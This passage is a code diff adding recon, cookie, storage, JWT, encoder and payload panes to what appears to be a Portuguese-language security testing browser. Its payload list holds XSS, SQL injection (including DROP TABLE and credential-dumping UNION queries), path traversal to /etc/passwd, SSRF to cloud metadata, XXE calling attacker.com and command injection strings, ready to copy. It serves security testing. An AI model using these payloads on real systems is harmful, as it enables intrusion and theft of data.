@@ -218,27 +218,92 @@ webview.active{visibility:visible;pointer-events:auto;}
 
 /* ── TOOLS PANEL ── */
 #tools-panel{
-  width:var(--tools-w);border-left:1px solid var(--bd);
+  width:400px;border-left:1px solid var(--bd);
   background:var(--sf);display:flex;flex-direction:column;
   flex-shrink:0;transition:width .25s ease,opacity .25s ease;overflow:hidden;
 }
 #tools-panel.hidden{width:0;opacity:0;pointer-events:none;}
 
 .tp-header{
-  display:flex;align-items:center;padding:10px 14px 0;gap:6px;flex-shrink:0;
+  display:flex;flex-wrap:wrap;padding:8px 8px 0;gap:2px;flex-shrink:0;
+  border-bottom:1px solid var(--bd);
 }
 .tp-tab{
-  flex:1;padding:7px 0;border:none;background:transparent;
-  color:var(--tx3);cursor:pointer;font-size:10px;font-family:'Orbitron';
-  font-weight:700;letter-spacing:.8px;border-bottom:2px solid transparent;
-  transition:all .15s;
+  padding:5px 8px;border:none;background:transparent;
+  color:var(--tx3);cursor:pointer;font-size:8.5px;font-family:'Orbitron';
+  font-weight:700;letter-spacing:.5px;border-bottom:2px solid transparent;
+  border-radius:5px 5px 0 0;transition:all .15s;white-space:nowrap;
 }
-.tp-tab.active{color:var(--c);border-bottom-color:var(--c);}
-.tp-tab:hover:not(.active){color:var(--tx2);}
+.tp-tab.active{color:var(--c);border-bottom-color:var(--c);background:rgba(0,229,255,.05);}
+.tp-tab:hover:not(.active){color:var(--tx2);background:rgba(255,255,255,.04);}
 
 .tp-body{flex:1;overflow:hidden;display:flex;flex-direction:column;}
 .tp-pane{display:none;flex-direction:column;height:100%;overflow:hidden;}
 .tp-pane.active{display:flex;}
+
+/* TOOL SHARED */
+.tool-section{padding:10px;border-bottom:1px solid var(--bd);flex-shrink:0;}
+.tool-label{font-size:9px;font-family:'Orbitron';color:var(--tx3);letter-spacing:.8px;margin-bottom:6px;}
+.tool-input{
+  width:100%;background:var(--sf2);border:1px solid var(--bd2);border-radius:7px;
+  padding:7px 10px;color:var(--tx);font-family:'JetBrains Mono';font-size:11px;
+  outline:none;box-sizing:border-box;resize:vertical;
+}
+.tool-input:focus{border-color:var(--c);}
+.tool-output{
+  flex:1;overflow-y:auto;padding:10px;font-family:'JetBrains Mono';font-size:11px;
+  color:var(--tx2);line-height:1.6;word-break:break-all;
+}
+.tool-btn{
+  padding:5px 12px;border:none;border-radius:6px;cursor:pointer;
+  font-family:'Orbitron';font-size:8px;font-weight:700;letter-spacing:.5px;
+  transition:all .15s;
+}
+.tool-btn-primary{background:linear-gradient(135deg,var(--c),var(--m));color:#07070f;}
+.tool-btn-secondary{background:rgba(255,255,255,.07);border:1px solid var(--bd2);color:var(--tx2);}
+.tool-btn:hover{opacity:.85;}
+.tool-row{display:flex;gap:6px;align-items:flex-start;margin-bottom:8px;}
+.tool-tag{
+  display:inline-block;padding:2px 7px;border-radius:4px;font-size:9px;
+  font-family:'JetBrains Mono';cursor:pointer;margin:2px;
+  background:rgba(0,229,255,.08);border:1px solid rgba(0,229,255,.2);color:var(--c);
+  transition:all .15s;
+}
+.tool-tag:hover{background:rgba(0,229,255,.18);}
+.tool-tag.danger{background:rgba(255,51,85,.08);border-color:rgba(255,51,85,.2);color:var(--r);}
+.tool-tag.warn{background:rgba(255,153,0,.08);border-color:rgba(255,153,0,.2);color:var(--w);}
+.tool-tag.ok{background:rgba(0,255,136,.08);border-color:rgba(0,255,136,.2);color:var(--g);}
+
+/* COOKIES */
+.cookie-row{
+  display:flex;align-items:center;gap:6px;padding:6px 10px;
+  border-bottom:1px solid var(--bd);font-size:10px;font-family:'JetBrains Mono';
+}
+.cookie-name{color:var(--c);flex:0 0 auto;max-width:120px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.cookie-val{flex:1;color:var(--tx3);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:9px;}
+.cookie-del{background:none;border:none;color:var(--r);cursor:pointer;font-size:10px;flex-shrink:0;opacity:.5;}
+.cookie-del:hover{opacity:1;}
+
+/* PAYLOADS */
+.payload-group{margin-bottom:12px;}
+.payload-group-title{
+  font-size:9px;font-family:'Orbitron';font-weight:700;color:var(--tx3);
+  letter-spacing:1px;padding:6px 10px;background:rgba(255,255,255,.03);
+  border-bottom:1px solid var(--bd);
+}
+.payload-item{
+  display:flex;align-items:center;padding:4px 10px;gap:8px;
+  border-bottom:1px solid rgba(255,255,255,.03);cursor:pointer;
+  transition:background .1s;
+}
+.payload-item:hover{background:rgba(0,229,255,.05);}
+.payload-code{flex:1;font-family:'JetBrains Mono';font-size:10px;color:var(--tx2);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.payload-copy{font-size:9px;color:var(--tx3);flex-shrink:0;}
+
+/* RECON */
+.recon-item{padding:8px 10px;border-bottom:1px solid var(--bd);}
+.recon-key{font-size:9px;font-family:'Orbitron';color:var(--tx3);letter-spacing:.5px;margin-bottom:4px;}
+.recon-val{font-family:'JetBrains Mono';font-size:10px;color:var(--tx2);word-break:break-all;}
 
 /* INTERCEPT */
 #intercept-toolbar{
@@ -472,6 +537,12 @@ webview.active{visibility:visible;pointer-events:auto;}
       <button class="tp-tab active" data-pane="intercept" onclick="switchPane(this)">INTERCEPT</button>
       <button class="tp-tab" data-pane="headers"   onclick="switchPane(this)">HEADERS</button>
       <button class="tp-tab" data-pane="tech"      onclick="switchPane(this)">TECH</button>
+      <button class="tp-tab" data-pane="cookies"   onclick="switchPane(this)">COOKIES</button>
+      <button class="tp-tab" data-pane="storage"   onclick="switchPane(this)">STORAGE</button>
+      <button class="tp-tab" data-pane="jwt"       onclick="switchPane(this)">JWT</button>
+      <button class="tp-tab" data-pane="encode"    onclick="switchPane(this)">ENCODE</button>
+      <button class="tp-tab" data-pane="payloads"  onclick="switchPane(this)">PAYLOADS</button>
+      <button class="tp-tab" data-pane="recon"     onclick="switchPane(this)">RECON</button>
       <button class="tp-tab" data-pane="notes"     onclick="switchPane(this)">NOTAS</button>
     </div>
     <div class="tp-body">
@@ -521,6 +592,99 @@ webview.active{visibility:visible;pointer-events:auto;}
         <div class="notes-domain" id="notes-domain">sem domínio activo</div>
         <textarea id="notes-textarea" placeholder="Notas para este alvo...&#10;&#10;- Findings&#10;- Paths interessantes&#10;- Credenciais testadas&#10;- Vulnerabilidades confirmadas"></textarea>
         <button class="notes-btn" onclick="saveNote()"><i class="fa-solid fa-floppy-disk"></i> GUARDAR NOTA</button>
+      </div>
+
+      <!-- COOKIES PANE -->
+      <div class="tp-pane" id="pane-cookies">
+        <div class="tool-section" style="display:flex;gap:6px;align-items:center;">
+          <button class="tool-btn tool-btn-primary" onclick="loadCookies()"><i class="fa-solid fa-rotate-right"></i> REFRESH</button>
+          <button class="tool-btn tool-btn-secondary" onclick="copyAllCookies()"><i class="fa-regular fa-copy"></i> COPIAR TUDO</button>
+          <span id="cookie-count" style="font-size:9px;color:var(--tx3);font-family:'JetBrains Mono';margin-left:auto;"></span>
+        </div>
+        <div id="cookies-list" style="flex:1;overflow-y:auto;">
+          <div class="empty-state"><i class="fa-solid fa-cookie-bite"></i><p>Clica REFRESH para carregar cookies</p></div>
+        </div>
+      </div>
+
+      <!-- STORAGE PANE -->
+      <div class="tp-pane" id="pane-storage">
+        <div class="tool-section" style="display:flex;gap:6px;flex-wrap:wrap;">
+          <button class="tool-btn tool-btn-primary" onclick="loadStorage('local')">LOCAL STORAGE</button>
+          <button class="tool-btn tool-btn-primary" onclick="loadStorage('session')">SESSION STORAGE</button>
+          <button class="tool-btn tool-btn-secondary" onclick="loadStorage('all')">AMBOS</button>
+        </div>
+        <div id="storage-out" class="tool-output">
+          <div class="empty-state"><i class="fa-solid fa-database"></i><p>Escolhe o tipo de storage</p></div>
+        </div>
+      </div>
+
+      <!-- JWT PANE -->
+      <div class="tp-pane" id="pane-jwt" style="gap:0;">
+        <div class="tool-section">
+          <div class="tool-label">COLAR TOKEN JWT</div>
+          <textarea id="jwt-input" class="tool-input" rows="3" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."></textarea>
+          <div style="display:flex;gap:6px;margin-top:6px;">
+            <button class="tool-btn tool-btn-primary" onclick="decodeJwt()">DECODE</button>
+            <button class="tool-btn tool-btn-secondary" onclick="document.getElementById('jwt-input').value='';document.getElementById('jwt-out').innerHTML='<div class=empty-state><i class=\'fa-solid fa-key\'></i><p>Cola um JWT acima</p></div>'">LIMPAR</button>
+          </div>
+        </div>
+        <div id="jwt-out" class="tool-output">
+          <div class="empty-state"><i class="fa-solid fa-key"></i><p>Cola um JWT acima</p></div>
+        </div>
+      </div>
+
+      <!-- ENCODE PANE -->
+      <div class="tp-pane" id="pane-encode" style="gap:0;">
+        <div class="tool-section">
+          <div class="tool-label">TEXTO / PAYLOAD</div>
+          <textarea id="enc-input" class="tool-input" rows="3" placeholder="Escreve aqui..."></textarea>
+          <div style="display:flex;gap:4px;flex-wrap:wrap;margin-top:6px;">
+            <button class="tool-btn tool-btn-primary" onclick="encDo('b64e')">B64 ↑</button>
+            <button class="tool-btn tool-btn-primary" onclick="encDo('b64d')">B64 ↓</button>
+            <button class="tool-btn tool-btn-secondary" onclick="encDo('urle')">URL ↑</button>
+            <button class="tool-btn tool-btn-secondary" onclick="encDo('urld')">URL ↓</button>
+            <button class="tool-btn tool-btn-secondary" onclick="encDo('htmle')">HTML ↑</button>
+            <button class="tool-btn tool-btn-secondary" onclick="encDo('hex')">HEX</button>
+            <button class="tool-btn tool-btn-secondary" onclick="encDo('md5')">MD5</button>
+            <button class="tool-btn tool-btn-secondary" onclick="encDo('sha1')">SHA1</button>
+            <button class="tool-btn tool-btn-secondary" onclick="encDo('sha256')">SHA256</button>
+            <button class="tool-btn tool-btn-secondary" onclick="encDo('rev')">REVERSE</button>
+          </div>
+        </div>
+        <div class="tool-section" style="flex:1;display:flex;flex-direction:column;overflow:hidden;">
+          <div style="display:flex;align-items:center;gap:6px;margin-bottom:6px;">
+            <div class="tool-label" style="margin:0;" id="enc-mode-label">RESULTADO</div>
+            <button class="tool-btn tool-btn-secondary" style="margin-left:auto;" onclick="copyEncResult()"><i class="fa-regular fa-copy"></i></button>
+          </div>
+          <textarea id="enc-output" class="tool-input" style="flex:1;resize:none;" readonly placeholder="Resultado aparece aqui..."></textarea>
+        </div>
+      </div>
+
+      <!-- PAYLOADS PANE -->
+      <div class="tp-pane" id="pane-payloads" style="flex-direction:column;">
+        <div class="tool-section" style="padding:6px 10px;">
+          <input id="payload-filter" class="tool-input" style="height:28px;padding:0 8px;" placeholder="filtrar payloads...">
+        </div>
+        <div id="payloads-list" style="flex:1;overflow-y:auto;"></div>
+      </div>
+
+      <!-- RECON PANE -->
+      <div class="tp-pane" id="pane-recon">
+        <div class="tool-section" style="display:flex;gap:6px;flex-wrap:wrap;">
+          <button class="tool-btn tool-btn-primary" onclick="reconRobots()">robots.txt</button>
+          <button class="tool-btn tool-btn-primary" onclick="reconSitemap()">sitemap.xml</button>
+          <button class="tool-btn tool-btn-secondary" onclick="reconLinks()">LINKS EXTERNOS</button>
+          <button class="tool-btn tool-btn-secondary" onclick="reconForms()">FORMS</button>
+        </div>
+        <div class="tool-section" style="display:flex;gap:6px;flex-wrap:wrap;">
+          <button class="tool-btn tool-btn-secondary" onclick="openReconTool('shodan')"><i class="fa-solid fa-radar"></i> Shodan</button>
+          <button class="tool-btn tool-btn-secondary" onclick="openReconTool('crtsh')"><i class="fa-solid fa-certificate"></i> crt.sh</button>
+          <button class="tool-btn tool-btn-secondary" onclick="openReconTool('wayback')"><i class="fa-solid fa-clock-rotate-left"></i> Archive</button>
+          <button class="tool-btn tool-btn-secondary" onclick="openReconTool('virustotal')"><i class="fa-solid fa-virus"></i> VT</button>
+        </div>
+        <div id="recon-out" class="tool-output" style="flex:1;">
+          <div class="empty-state"><i class="fa-solid fa-crosshairs"></i><p>Escolhe uma opção de reconhecimento</p></div>
+        </div>
       </div>
 
     </div>
@@ -1284,6 +1448,409 @@ document.getElementById('sb-dot').className = 'sb-dot on';
 document.getElementById('sb-capture-label').textContent = 'a capturar';
 // Fetch initial IP after 2s
 setTimeout(refreshIp, 2000);
+
+// ── PHANTOM: COOKIES ─────────────────────────────────────────────────────────
+async function loadCookies() {
+  const tab = getActiveTab();
+  const url = tab?.url || null;
+  const list = document.getElementById('cookies-list');
+  list.innerHTML = '<div class="empty-state"><i class="fa-solid fa-spinner fa-spin"></i><p>A carregar...</p></div>';
+  const cookies = url
+    ? await window.ave.getCookies(url)
+    : await window.ave.getAllCookies();
+  document.getElementById('cookie-count').textContent = cookies.length + ' cookies';
+  if (!cookies.length) {
+    list.innerHTML = '<div class="empty-state"><i class="fa-solid fa-cookie-bite"></i><p>Sem cookies para este site</p></div>';
+    return;
+  }
+  list.innerHTML = cookies.map((c,i) => `
+    <div class="cookie-row" id="cr-${i}">
+      <span class="cookie-name" title="${esc(c.name)}">${esc(c.name)}</span>
+      <span class="cookie-val" title="${esc(c.value)}">${esc(c.value || '—')}</span>
+      <span class="tool-tag" style="margin:0;font-size:8px;" onclick="copyCookie(${i},'${esc(c.name)}','${esc(c.value)}')">COPY</span>
+      ${c.domain ? `<button class="cookie-del" title="Remover" onclick="deleteCookie('${esc('https://'+c.domain)}','${esc(c.name)}',${i})"><i class="fa-solid fa-xmark"></i></button>` : ''}
+    </div>
+  `).join('');
+  window._lastCookies = cookies;
+}
+
+function copyCookie(i, name, value) {
+  navigator.clipboard.writeText(`${name}=${value}`);
+  showToast('Copiado: ' + name);
+}
+
+async function deleteCookie(url, name, rowIdx) {
+  await window.ave.removeCookie(url, name);
+  const row = document.getElementById('cr-' + rowIdx);
+  if (row) { row.style.opacity = '.3'; row.style.pointerEvents = 'none'; }
+  showToast('Cookie removido: ' + name);
+}
+
+function copyAllCookies() {
+  if (!window._lastCookies?.length) { showToast('Carrega os cookies primeiro'); return; }
+  const txt = window._lastCookies.map(c => `${c.name}=${c.value}`).join('; ');
+  navigator.clipboard.writeText(txt);
+  showToast('Todos os cookies copiados (' + window._lastCookies.length + ')');
+}
+
+// ── PHANTOM: STORAGE ─────────────────────────────────────────────────────────
+async function loadStorage(type) {
+  const wv = getActiveTab()?.wv;
+  const out = document.getElementById('storage-out');
+  if (!wv) { out.innerHTML = '<div class="empty-state"><i class="fa-solid fa-database"></i><p>Abre um site primeiro</p></div>'; return; }
+  out.innerHTML = '<div class="empty-state"><i class="fa-solid fa-spinner fa-spin"></i><p>A ler storage...</p></div>';
+  try {
+    let html = '';
+    if (type === 'local' || type === 'all') {
+      const raw = await wv.executeJavaScript('(()=>{const d={};for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);d[k]=localStorage.getItem(k);}return JSON.stringify(d)})()');
+      const data = JSON.parse(raw || '{}');
+      const keys = Object.keys(data);
+      html += `<div class="payload-group-title">LOCAL STORAGE — ${keys.length} itens</div>`;
+      if (!keys.length) html += `<div style="padding:8px 10px;font-size:10px;color:var(--tx3);">Vazio</div>`;
+      keys.forEach(k => {
+        html += `<div class="cookie-row"><span class="cookie-name" title="${esc(k)}">${esc(k)}</span><span class="cookie-val" title="${esc(data[k])}">${esc(data[k])}</span><span class="tool-tag" style="margin:0;font-size:8px;" onclick="navigator.clipboard.writeText(${JSON.stringify(data[k])});showToast('Copiado')">COPY</span></div>`;
+      });
+    }
+    if (type === 'session' || type === 'all') {
+      const raw2 = await wv.executeJavaScript('(()=>{const d={};for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);d[k]=sessionStorage.getItem(k);}return JSON.stringify(d)})()');
+      const data2 = JSON.parse(raw2 || '{}');
+      const keys2 = Object.keys(data2);
+      html += `<div class="payload-group-title" style="margin-top:4px;">SESSION STORAGE — ${keys2.length} itens</div>`;
+      if (!keys2.length) html += `<div style="padding:8px 10px;font-size:10px;color:var(--tx3);">Vazio</div>`;
+      keys2.forEach(k => {
+        html += `<div class="cookie-row"><span class="cookie-name" title="${esc(k)}">${esc(k)}</span><span class="cookie-val" title="${esc(data2[k])}">${esc(data2[k])}</span><span class="tool-tag" style="margin:0;font-size:8px;" onclick="navigator.clipboard.writeText(${JSON.stringify(data2[k])});showToast('Copiado')">COPY</span></div>`;
+      });
+    }
+    out.innerHTML = html || '<div class="empty-state"><i class="fa-solid fa-database"></i><p>Vazio</p></div>';
+  } catch(e) {
+    out.innerHTML = `<div class="empty-state"><i class="fa-solid fa-triangle-exclamation"></i><p>Erro: ${esc(e.message)}</p></div>`;
+  }
+}
+
+// ── PHANTOM: JWT ──────────────────────────────────────────────────────────────
+function decodeJwt() {
+  const token = document.getElementById('jwt-input').value.trim();
+  const out = document.getElementById('jwt-out');
+  if (!token) { out.innerHTML = '<div class="empty-state"><i class="fa-solid fa-key"></i><p>Cola um JWT</p></div>'; return; }
+  try {
+    const parts = token.split('.');
+    if (parts.length < 2) throw new Error('Formato inválido — não é um JWT válido');
+    const dec = (s) => {
+      s = s.replace(/-/g,'+').replace(/_/g,'/');
+      while (s.length % 4) s += '=';
+      return JSON.parse(atob(s));
+    };
+    const header = dec(parts[0]);
+    const payload = dec(parts[1]);
+    const now = Math.floor(Date.now()/1000);
+    const expired = payload.exp && payload.exp < now;
+    const expDate = payload.exp ? new Date(payload.exp*1000).toLocaleString() : null;
+    const issuedDate = payload.iat ? new Date(payload.iat*1000).toLocaleString() : null;
+
+    let html = `
+      <div class="recon-item">
+        <div class="recon-key">HEADER</div>
+        <div class="recon-val" style="color:var(--c);">${esc(JSON.stringify(header, null, 2))}</div>
+      </div>
+      <div class="recon-item">
+        <div class="recon-key">ALGORITHM</div>
+        <div class="recon-val">
+          <span class="tool-tag ${header.alg === 'none' ? 'danger' : header.alg?.startsWith('HS') ? 'warn' : 'ok'}">${esc(header.alg || '?')}</span>
+          ${header.alg === 'none' ? '<span style="color:var(--r);font-size:9px;"> ⚠ NENHUM ALGORITMO — vulnerável!</span>' : ''}
+          ${header.alg?.startsWith('HS') ? '<span style="color:var(--w);font-size:9px;"> ⚠ HMAC simétrico — possível brute-force</span>' : ''}
+        </div>
+      </div>
+      <div class="recon-item">
+        <div class="recon-key">PAYLOAD</div>
+        <div class="recon-val" style="color:var(--g);">${esc(JSON.stringify(payload, null, 2))}</div>
+      </div>`;
+    if (payload.exp) {
+      html += `
+      <div class="recon-item">
+        <div class="recon-key">EXPIRAÇÃO</div>
+        <div class="recon-val">
+          <span class="tool-tag ${expired ? 'danger' : 'ok'}">${expired ? '⚠ EXPIRADO' : '✓ VÁLIDO'}</span>
+          <span style="font-size:9px;color:var(--tx3);margin-left:4px;">${expDate}</span>
+        </div>
+      </div>`;
+    }
+    if (issuedDate) {
+      html += `<div class="recon-item"><div class="recon-key">EMITIDO EM</div><div class="recon-val" style="font-size:10px;">${issuedDate}</div></div>`;
+    }
+    html += `<div class="recon-item"><div class="recon-key">ASSINATURA</div><div class="recon-val" style="word-break:break-all;font-size:9px;color:var(--m);">${esc(parts[2] || 'ausente')}</div></div>`;
+    out.innerHTML = html;
+  } catch(e) {
+    out.innerHTML = `<div class="recon-item"><div class="recon-key">ERRO</div><div class="recon-val" style="color:var(--r);">${esc(e.message)}</div></div>`;
+  }
+}
+
+// ── PHANTOM: ENCODER / DECODER ────────────────────────────────────────────────
+async function encDo(mode) {
+  const inp = document.getElementById('enc-input').value;
+  const lbl = document.getElementById('enc-mode-label');
+  let result = '';
+  const labels = {b64e:'BASE64 ENCODE',b64d:'BASE64 DECODE',urle:'URL ENCODE',urld:'URL DECODE',htmle:'HTML ENCODE',hex:'HEX ENCODE',md5:'MD5 HASH',sha1:'SHA-1 HASH',sha256:'SHA-256 HASH',rev:'REVERSED'};
+  lbl.textContent = labels[mode] || 'RESULTADO';
+  try {
+    switch(mode) {
+      case 'b64e': result = btoa(unescape(encodeURIComponent(inp))); break;
+      case 'b64d': result = decodeURIComponent(escape(atob(inp.trim()))); break;
+      case 'urle': result = encodeURIComponent(inp); break;
+      case 'urld': result = decodeURIComponent(inp); break;
+      case 'htmle': result = inp.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#x27;'); break;
+      case 'hex':  result = Array.from(new TextEncoder().encode(inp)).map(b=>b.toString(16).padStart(2,'0')).join(' '); break;
+      case 'rev':  result = inp.split('').reverse().join(''); break;
+      case 'md5': case 'sha1': case 'sha256': {
+        const alg = mode === 'md5' ? null : mode === 'sha1' ? 'SHA-1' : 'SHA-256';
+        if (!alg) { result = '[MD5 requer biblioteca externa — usa SHA-256]'; break; }
+        const data = new TextEncoder().encode(inp);
+        const hash = await crypto.subtle.digest(alg, data);
+        result = Array.from(new Uint8Array(hash)).map(b=>b.toString(16).padStart(2,'0')).join('');
+        break;
+      }
+    }
+  } catch(e) { result = 'ERRO: ' + e.message; }
+  document.getElementById('enc-output').value = result;
+}
+
+function copyEncResult() {
+  const val = document.getElementById('enc-output').value;
+  if (!val) return;
+  navigator.clipboard.writeText(val);
+  showToast('Resultado copiado');
+}
+
+// ── PHANTOM: PAYLOADS ─────────────────────────────────────────────────────────
+const PAYLOADS = [
+  { cat:'XSS Básico', items:[
+    `<script>alert(1)</script>`,
+    `"><script>alert(document.domain)</script>`,
+    `'><img src=x onerror=alert(1)>`,
+    `javascript:alert(document.cookie)`,
+    `<svg onload=alert(1)>`,
+    `<img src=1 onerror=alert(document.cookie)>`,
+    `<details open ontoggle=alert(1)>`,
+    `"><iframe src=javascript:alert(1)>`,
+  ]},
+  { cat:'XSS Filter Bypass', items:[
+    `<ScRiPt>alert(1)</sCrIpT>`,
+    `%3Cscript%3Ealert(1)%3C/script%3E`,
+    `&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;`,
+    `<script>alert(1)</script>`,
+    `<scr\x00ipt>alert(1)</scr\x00ipt>`,
+    `<script/src=//evil.com>`,
+  ]},
+  { cat:'SQL Injection', items:[
+    `' OR '1'='1`,
+    `' OR 1=1--`,
+    `admin'--`,
+    `'; DROP TABLE users;--`,
+    `' UNION SELECT null,null,null--`,
+    `' UNION SELECT username,password FROM users--`,
+    `1' AND SLEEP(5)--`,
+    `'; WAITFOR DELAY '0:0:5'--`,
+  ]},
+  { cat:'SQLi Blind / Time-based', items:[
+    `1 AND 1=1`,
+    `1 AND 1=2`,
+    `1' AND SLEEP(5)-- -`,
+    `1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)`,
+    `'; IF (1=1) WAITFOR DELAY '0:0:5'--`,
+  ]},
+  { cat:'LFI / Path Traversal', items:[
+    `../../../etc/passwd`,
+    `..%2F..%2F..%2Fetc%2Fpasswd`,
+    `....//....//....//etc/passwd`,
+    `/etc/passwd`,
+    `C:\\Windows\\System32\\drivers\\etc\\hosts`,
+    `php://filter/convert.base64-encode/resource=index.php`,
+    `php://input`,
+  ]},
+  { cat:'SSRF', items:[
+    `http://127.0.0.1/`,
+    `http://localhost:80/`,
+    `http://169.254.169.254/latest/meta-data/`,
+    `http://[::1]/`,
+    `http://0.0.0.0/`,
+    `http://0177.0.0.1/`,
+    `http://2130706433/`,
+  ]},
+  { cat:'Open Redirect', items:[
+    `//evil.com`,
+    `/\\evil.com`,
+    `https://evil.com`,
+    `javascript:alert(document.domain)`,
+    `data:text/html,<script>alert(1)</script>`,
+    `/%09/evil.com`,
+  ]},
+  { cat:'XXE', items:[
+    `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
+    `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/">]><root>&xxe;</root>`,
+  ]},
+  { cat:'SSTI (Jinja2/Twig)', items:[
+    `{{7*7}}`,
+    `{{config}}`,
+    `{{''.__class__.__mro__[2].__subclasses__()}}`,
+    `{% for c in [1,2,3] %}{{c}}{% endfor %}`,
+    `${7*7}`,
+    `<%= 7*7 %>`,
+  ]},
+  { cat:'Command Injection', items:[
+    `; ls -la`,
+    `| whoami`,
+    `& whoami`,
+    `\`whoami\``,
+    `$(whoami)`,
+    `; cat /etc/passwd`,
+    `%0a whoami`,
+  ]},
+];
+
+function renderPayloads(filter='') {
+  const list = document.getElementById('payloads-list');
+  const fl = filter.toLowerCase();
+  let html = '';
+  PAYLOADS.forEach(group => {
+    const filtered = group.items.filter(p => !fl || p.toLowerCase().includes(fl) || group.cat.toLowerCase().includes(fl));
+    if (!filtered.length) return;
+    html += `<div class="payload-group"><div class="payload-group-title">${esc(group.cat)} <span style="color:var(--tx3);font-size:8px;">(${filtered.length})</span></div>`;
+    filtered.forEach(p => {
+      html += `<div class="payload-item" onclick="copyPayload(this,'${p.replace(/'/g,"\\'").replace(/\n/g,'\\n')}')">
+        <span class="payload-code">${esc(p)}</span>
+        <span class="payload-copy"><i class="fa-regular fa-copy"></i></span>
+      </div>`;
+    });
+    html += '</div>';
+  });
+  list.innerHTML = html || '<div class="empty-state"><i class="fa-solid fa-ban"></i><p>Sem resultados</p></div>';
+}
+
+function copyPayload(el, p) {
+  navigator.clipboard.writeText(p);
+  const icon = el.querySelector('.payload-copy');
+  icon.innerHTML = '<i class="fa-solid fa-check" style="color:var(--g);"></i>';
+  setTimeout(() => { icon.innerHTML = '<i class="fa-regular fa-copy"></i>'; }, 1200);
+  showToast('Payload copiado');
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+  renderPayloads();
+  document.getElementById('payload-filter').addEventListener('input', e => renderPayloads(e.target.value));
+});
+
+// ── PHANTOM: RECON ────────────────────────────────────────────────────────────
+async function reconFetch(url) {
+  const tab = getActiveTab();
+  if (!tab?.wv) return null;
+  try {
+    const res = await tab.wv.executeJavaScript(`
+      fetch(${JSON.stringify(url)}, {credentials:'omit'}).then(r=>r.text()).catch(()=>null)
+    `);
+    return res;
+  } catch { return null; }
+}
+
+async function reconRobots() {
+  const tab = getActiveTab();
+  const out = document.getElementById('recon-out');
+  if (!tab?.url) { out.innerHTML = '<div class="empty-state"><i class="fa-solid fa-crosshairs"></i><p>Navega para um site primeiro</p></div>'; return; }
+  out.innerHTML = '<div class="empty-state"><i class="fa-solid fa-spinner fa-spin"></i><p>A buscar robots.txt...</p></div>';
+  try {
+    const base = new URL(tab.url).origin;
+    const txt = await reconFetch(base + '/robots.txt');
+    if (!txt) { out.innerHTML = `<div class="recon-item"><div class="recon-key">robots.txt</div><div class="recon-val" style="color:var(--r);">Não encontrado ou bloqueado</div></div>`; return; }
+    const paths = (txt.match(/(?:Disallow|Allow):\s*(.+)/gi) || []);
+    out.innerHTML = `
+      <div class="recon-item"><div class="recon-key">robots.txt — ${base}</div>
+      <div class="recon-val" style="white-space:pre;font-size:9px;color:var(--g);">${esc(txt.substring(0,2000))}</div></div>
+      ${paths.length ? `<div class="recon-item"><div class="recon-key">PATHS ENCONTRADOS (${paths.length})</div>
+      <div>${paths.map(p=>`<div class="tool-tag" onclick="navigate('${base}${esc(p.split(':')[1]?.trim()||'')}')" style="margin:3px;">${esc(p)}</div>`).join('')}</div></div>` : ''}
+    `;
+  } catch(e) { out.innerHTML = `<div class="recon-item"><div class="recon-key">ERRO</div><div class="recon-val" style="color:var(--r);">${esc(e.message)}</div></div>`; }
+}
+
+async function reconSitemap() {
+  const tab = getActiveTab();
+  const out = document.getElementById('recon-out');
+  if (!tab?.url) { out.innerHTML = '<div class="empty-state"><i class="fa-solid fa-crosshairs"></i><p>Navega para um site primeiro</p></div>'; return; }
+  out.innerHTML = '<div class="empty-state"><i class="fa-solid fa-spinner fa-spin"></i><p>A buscar sitemap.xml...</p></div>';
+  try {
+    const base = new URL(tab.url).origin;
+    const txt = await reconFetch(base + '/sitemap.xml');
+    if (!txt) { out.innerHTML = `<div class="recon-item"><div class="recon-key">sitemap.xml</div><div class="recon-val" style="color:var(--r);">Não encontrado</div></div>`; return; }
+    const urls = [...txt.matchAll(/<loc>(.*?)<\/loc>/g)].map(m=>m[1]);
+    out.innerHTML = `
+      <div class="recon-item"><div class="recon-key">SITEMAP — ${urls.length} URLs</div>
+      <div>${urls.slice(0,50).map(u=>`<div class="tool-tag" onclick="navigate('${esc(u)}')" style="margin:2px;max-width:100%;overflow:hidden;text-overflow:ellipsis;">${esc(u)}</div>`).join('')}
+      ${urls.length > 50 ? `<div style="font-size:9px;color:var(--tx3);padding:6px;">... e mais ${urls.length-50}</div>` : ''}</div></div>
+    `;
+  } catch(e) { out.innerHTML = `<div class="recon-item"><div class="recon-key">ERRO</div><div class="recon-val" style="color:var(--r);">${esc(e.message)}</div></div>`; }
+}
+
+async function reconLinks() {
+  const tab = getActiveTab();
+  const out = document.getElementById('recon-out');
+  if (!tab?.wv) { out.innerHTML = '<div class="empty-state"><i class="fa-solid fa-crosshairs"></i><p>Navega para um site primeiro</p></div>'; return; }
+  out.innerHTML = '<div class="empty-state"><i class="fa-solid fa-spinner fa-spin"></i><p>A analisar links...</p></div>';
+  try {
+    const domain = getDomain(tab.url);
+    const res = await tab.wv.executeJavaScript(`
+      (()=>{const a=[...document.querySelectorAll('a[href]')].map(e=>e.href).filter(h=>h.startsWith('http'));
+      const ext=a.filter(h=>!h.includes(${JSON.stringify(domain)}));
+      const int=a.filter(h=>h.includes(${JSON.stringify(domain)}));
+      return JSON.stringify({ext:[...new Set(ext)],int:[...new Set(int)]})})()
+    `);
+    const {ext, int} = JSON.parse(res);
+    out.innerHTML = `
+      <div class="recon-item"><div class="recon-key">LINKS EXTERNOS (${ext.length})</div>
+      <div>${ext.slice(0,30).map(u=>`<div class="tool-tag danger" onclick="navigate('${esc(u)}')" style="margin:2px;display:block;overflow:hidden;text-overflow:ellipsis;">${esc(u)}</div>`).join('')}</div></div>
+      <div class="recon-item"><div class="recon-key">LINKS INTERNOS (${int.length})</div>
